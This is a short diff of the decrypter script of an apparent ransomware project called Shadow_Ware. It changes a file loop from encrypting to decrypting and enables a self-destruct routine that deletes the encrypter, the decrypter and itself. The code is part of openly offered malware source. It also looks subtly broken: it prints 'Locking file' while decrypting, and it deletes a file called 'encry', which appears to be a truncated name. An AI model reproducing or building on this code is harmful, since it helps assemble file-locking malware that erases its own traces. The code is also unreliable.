@@ -70,7 +70,7 @@ class Shadow_Ware():
     for file in files:
       if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath("decrypter.py"):
         print("Locking file " + file)
-        self.encrypt_file(file, file + ".locked")
+        self.decrypt_file(file, file[0:-7])
 
   # Remove not locked files
   def remove_locked_files(self):
@@ -86,10 +86,11 @@ class Shadow_Ware():
     os.remove(os.path.abspath("encrypter.py"))
     os.remove(os.path.abspath("encrypter.py.locked"))
     os.remove(os.path.abspath("decrypter.py.locked"))
+    os.remove(os.path.abspath("encry"))
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
   shadow_ware = Shadow_Ware()
   shadow_ware.decrypt_all_files()
   shadow_ware.remove_locked_files()
-  #shadow_ware.self_destruct()
+  shadow_ware.self_destruct()
